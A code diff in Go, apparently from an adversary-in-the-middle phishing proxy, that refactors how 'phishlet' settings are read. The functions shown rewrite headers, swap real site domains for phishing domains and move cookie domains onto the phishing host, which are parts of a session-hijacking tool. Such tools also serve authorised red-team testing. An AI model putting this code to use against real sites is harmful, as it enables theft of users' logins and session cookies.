@@ -58,15 +58,15 @@ func firstIP(xff string) string {
 	return strings.TrimSpace(parts[0])
 }
 
-func rewriteHeader(req *http.Request, header string, p *aitm.Phishlet) {
+func rewriteHeader(req *http.Request, header string, p *aitm.ConfiguredPhishlet) {
 	parsed, err := url.Parse(req.Header.Get(header))
 	if err != nil {
 		return
 	}
 	host := parsed.Hostname()
 
-	for _, ph := range p.ProxyHosts {
-		phishHost := ph.PhishHost(p.BaseDomain)
+	for _, ph := range p.Definition.ProxyHosts {
+		phishHost := ph.PhishHost(p.Config.BaseDomain)
 		if strings.EqualFold(host, phishHost) {
 			parsed.Scheme = ph.UpstreamScheme
 			parsed.Host = ph.OriginHost()
@@ -136,14 +136,14 @@ func isMutableMIME(contentType string) bool {
 	return false
 }
 
-func autoFilterReplacer(p *aitm.Phishlet) *strings.Replacer {
+func autoFilterReplacer(p *aitm.ConfiguredPhishlet) *strings.Replacer {
 	var pairs []string
-	for _, ph := range p.ProxyHosts {
+	for _, ph := range p.Definition.ProxyHosts {
 		if !ph.AutoFilter {
 			continue
 		}
 		origin := ph.OriginHost()
-		phish := ph.PhishHost(p.BaseDomain)
+		phish := ph.PhishHost(p.Config.BaseDomain)
 		pairs = append(pairs, ph.UpstreamScheme+"://"+origin, "https://"+phish, origin, phish)
 	}
 	if len(pairs) == 0 {
@@ -152,11 +152,11 @@ func autoFilterReplacer(p *aitm.Phishlet) *strings.Replacer {
 	return strings.NewReplacer(pairs...)
 }
 
-func rewriteCookieDomain(upstreamDomain string, p *aitm.Phishlet) string {
+func rewriteCookieDomain(upstreamDomain string, p *aitm.ConfiguredPhishlet) string {
 	cleanDomain := strings.TrimPrefix(strings.ToLower(upstreamDomain), ".")
-	for _, proxyHost := range p.ProxyHosts {
+	for _, proxyHost := range p.Definition.ProxyHosts {
 		if strings.HasSuffix(cleanDomain, strings.ToLower(proxyHost.Domain)) {
-			return proxyHost.PhishHost(p.BaseDomain)
+			return proxyHost.PhishHost(p.Config.BaseDomain)
 		}
 	}
 	return upstreamDomain
